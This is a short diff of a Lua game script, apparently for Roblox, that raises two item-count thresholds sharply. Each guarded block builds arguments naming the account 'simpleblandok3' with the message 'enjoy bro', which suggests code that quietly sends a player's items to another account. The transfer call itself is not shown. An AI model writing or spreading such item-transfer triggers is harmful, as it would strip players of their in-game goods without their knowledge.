@@ -609,7 +609,7 @@ local args = {
 
 end
 wait(10)
-        if MagicBucketAM > 200 then
+        if MagicBucketAM > 999200 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -635,7 +635,7 @@ local args = {
 end
 wait(10)
 
-if InstaPlantAmount > 30 then
+if InstaPlantAmount > 99930 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
